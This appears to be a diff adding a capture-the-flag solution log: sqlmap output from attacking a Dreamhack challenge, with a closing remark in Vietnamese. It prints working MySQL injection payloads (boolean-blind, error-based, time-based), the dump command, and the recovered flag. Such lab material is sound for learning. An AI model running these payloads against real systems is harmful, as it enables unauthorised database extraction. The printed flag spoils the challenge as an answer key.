@@ -1,0 +1,54 @@
+$ sqlmap -u http://host3.dreamhack.games:11404/?uid=1 -D users -T user -C upw --dump
+        ___
+       __H__
+ ___ ___[']_____ ___ ___  {1.6.4#stable}
+|_ -| . [(]     | .'| . |
+|___|_  [)]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 20:55:13 /2024-11-14/
+
+[20:55:13] [INFO] resuming back-end DBMS 'mysql'
+[20:55:13] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: uid (GET)
+    Type: boolean-based blind
+    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
+    Payload: uid=1' RLIKE (SELECT (CASE WHEN (2013=2013) THEN 1 ELSE 0x28 END))-- PBAO
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: uid=1' AND (SELECT 2152 FROM(SELECT COUNT(*),CONCAT(0x7170766b71,(SELECT (ELT(2152=2152,1))),0x7176706a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- ObJR
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: uid=1' AND (SELECT 7121 FROM (SELECT(SLEEP(5)))MlDH)-- PEMS
+---
+[20:55:13] [INFO] the back-end DBMS is MySQL
+back-end DBMS: MySQL >= 5.0 (MariaDB fork)
+[20:55:13] [INFO] fetching entries of column(s) 'upw' for table 'user' in database 'users'
+[20:55:14] [INFO] retrieved: 'DH{c3968c78840750168774ad951fc98bf788563c4d}'
+[20:55:14] [INFO] retrieved: 'guest'
+[20:55:14] [INFO] retrieved: 'test'
+Database: users
+Table: user
+[3 entries]
++----------------------------------------------+
+| upw                                          |
++----------------------------------------------+
+| DH{c3968c78840750168774ad951fc98bf788563c4d} |
+| guest                                        |
+| test                                         |
++----------------------------------------------+
+
+[20:55:14] [INFO] table 'users.`user`' dumped to CSV file '/home/baopr/.local/share/sqlmap/output/host3.dreamhack.games/dump/users/user.csv'
+[20:55:14] [INFO] fetched data logged to text files under '/home/baopr/.local/share/sqlmap/output/host3.dreamhack.games'
+[20:55:14] [WARNING] your sqlmap version is outdated
+
+[*] ending @ 20:55:14 /2024-11-14/
+
+
+baif nayf nả thằng SQLmap vào
